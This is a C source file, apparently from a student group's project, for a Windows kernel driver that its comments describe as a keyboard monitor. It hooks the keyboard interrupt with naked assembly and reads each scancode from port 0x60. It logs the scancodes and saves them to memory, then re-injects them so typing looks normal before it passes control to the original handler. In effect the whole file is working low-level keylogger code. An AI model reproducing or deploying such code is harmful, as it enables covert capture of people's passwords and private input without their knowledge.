/*
*******************************************************************************
*= = 文件名称：MyInterruptProc.c
*= = 文件描述：键盘监控驱动MyInterruptProc读取端口数据
*= = 作    者：胡默迪小组
*= = 编写时间：2016-07-09 19:18:00
*******************************************************************************
*/

#include "MyInterruptProc.h"

//*============================================================================ 
//*= = 全局变量 
//*============================================================================

extern void *Origin_address;

KSPIN_LOCK SpinLock;
UCHAR KbBuff[LOG_PRE_SIZE] = { 0 };
ULONG CurPos = 0;

//*============================================================================
//*= = 函数名称：TryKbRead
//*= = 功能描述：测试是否可以读取键盘输入
//*= = 入口参数：VOID 
//*= = 出口参数：ULONG
//*============================================================================

ULONG TryKbRead()
{
	ULONG count = 100;
	CHAR ch;

	//自旋锁
	while (count--){
		ch = READ_PORT_UCHAR((PUCHAR)0x64);
		KeStallExecutionProcessor(50);
		//测试是否有输出信息待读取
		if (!(ch & OBUFFER_FULL))
			break;
	}
	//返回结果
	return count ? TRUE : FALSE;
}

//*============================================================================
//*= = 函数名称：TryKbWrite
//*= = 功能描述：测试是否可以写入键盘端口
//*= = 入口参数：VOID 
//*= = 出口参数：ULONG
//*============================================================================

ULONG TryKbWrite()
{
	ULONG count = 100;
	CHAR ch;

	//自旋锁
	while (count--){
		ch = READ_PORT_UCHAR((PUCHAR)0x64);
		KeStallExecutionProcessor(50);
		//判断是否需要写入信息
		if (!(ch & IBUFFER_FULL))
			break;
	}
	//返回结果
	return count ? TRUE : FALSE;
}

//*============================================================================
//*= = 函数名称：InKbBuff
//*= = 功能描述：判断截获字符是否缓冲区中
//*= = 入口参数：UCHAR 
//*= = 出口参数：ULONG
//*============================================================================

BOOLEAN InKbBuff(UCHAR CurCh)
{
	ULONG i = 0;
	for (i = 0; i < CurPos; i++)
		if (CurCh == KbBuff[i])
			return TRUE;

	return FALSE;
}

//*============================================================================
//*= = 函数名称：PushKbBuff
//*= = 功能描述：将截获的输入码存入缓冲区
//*= = 入口参数：UCHAR 
//*= = 出口参数：ULONG
//*============================================================================

VOID PushKbBuff(UCHAR CurCh)
{
	ULONG i = 0;
	for (i = 0; i < CurPos; i++)
	{
		if (KbBuff[i] == 0)
		{
			KbBuff[i] = CurCh;
			return;
		}
	}

	KbBuff[CurPos++] = CurCh;
}

//*============================================================================
//*= = 函数名称：PopKbBuff
//*= = 功能描述：删除缓冲区中对应字符
//*= = 入口参数：UCHAR 
//*= = 出口参数：VOID
//*============================================================================

VOID PopKbBuff(UCHAR CurCh)
{
	LONG i = 0;
	for (i = 0; i < CurPos; i++)
		if (CurCh == KbBuff[i]){
			KbBuff[i] = 0;
			break;
		}
	for (i = CurPos - 1; i >= 0; i--){
		if (KbBuff[i] == 0){
			--CurPos;
		}
		else
			break;
	}
}

//*============================================================================
//*= = 函数名称：MyPortFilter
//*= = 功能描述：端口过滤
//*= = 入口参数：VOID 
//*= = 出口参数：VOID
//*============================================================================

VOID MyPortFilter()
{
	UCHAR CurCh;
	KIRQL CurIrql, OldIrql;
	static BOOLEAN ExtFlag =  FALSE;

	//判断当前的IRQL
	CurIrql = KeGetCurrentIrql();
	CurIrql < DISPATCH_LEVEL ? 
		KeAcquireSpinLock(&SpinLock, &OldIrql) : KeAcquireSpinLockAtDpcLevel(&SpinLock);

	//测试是否可读 自旋等待
	while (!TryKbRead());

	//读取
	CurCh = READ_PORT_UCHAR((PUCHAR)0x60);

	//替换头尾
	if (ExtFlag && (0x2a == CurCh || 0xaa == CurCh)){
		while (!TryKbWrite());
		WRITE_PORT_UCHAR((PUCHAR)0x64, (UCHAR)0xd2);
		while (!TryKbWrite());
		WRITE_PORT_UCHAR((PUCHAR)0x60, (UCHAR)0x00);
	}
	else if (0xe0 == CurCh)								//进入双字节扩展键判断
		ExtFlag = TRUE;
	else if (!InKbBuff(CurCh)){							//判断是否在缓冲区中(单字节)	
		if (CurCh < 0x80)
			KdPrint(("[*]Makecode:%2x\n", CurCh));
		else
			KdPrint(("[*]Breakcode:%2x\n", CurCh));

		if (ExtFlag){
			ExtFlag = FALSE;
			KdPrint(("[*]ExtRecord:%2x\n", CurCh));
			SaveMem(CurCh);
		}else{
			PushKbBuff(CurCh);							//存储当前字符
			while (!TryKbWrite());						//自旋锁

			//写入命令
			WRITE_PORT_UCHAR((PUCHAR)0x64, (UCHAR)0xd2);

			while (!TryKbWrite());						//自旋锁

			WRITE_PORT_UCHAR((PUCHAR)0x60, (UCHAR)CurCh);

			//写入内存
			SaveMem(CurCh);
		}
	}else{
		PopKbBuff(CurCh);								//清理缓冲区
	}

	//判断当前的IRQL
	CurIrql < DISPATCH_LEVEL ?
		KeReleaseSpinLock(&SpinLock, OldIrql) : KeReleaseSpinLockFromDpcLevel(&SpinLock);
}

//*============================================================================
//*= = 函数名称：MyInterruptProc
//*= = 功能描述：裸函数，不添加C函数架构
//*= = 入口参数：VOID 
//*= = 出口参数：VOID
//*============================================================================

__declspec(naked) VOID MyInterruptProc()
{
	__asm
	{
		pushad								// 保存所有的通用寄存器
		pushfd								// 保存标志寄存器
		push fs
		mov bx, 0x30
		mov fs, bx							//fs段寄存器在内核态值固定为0x30
		push ds
		push es
	}

	MyPortFilter();							// 调用DIY处理函数

	__asm
	{
		pop es
		pop ds
		pop fs
		popfd								// 恢复标志寄存器
		popad								// 恢复通用寄存器
		jmp Origin_address					// 跳到原来的中断服务程序
	}
}

//*============================================================================
//*= = 文件结束 
//*============================================================================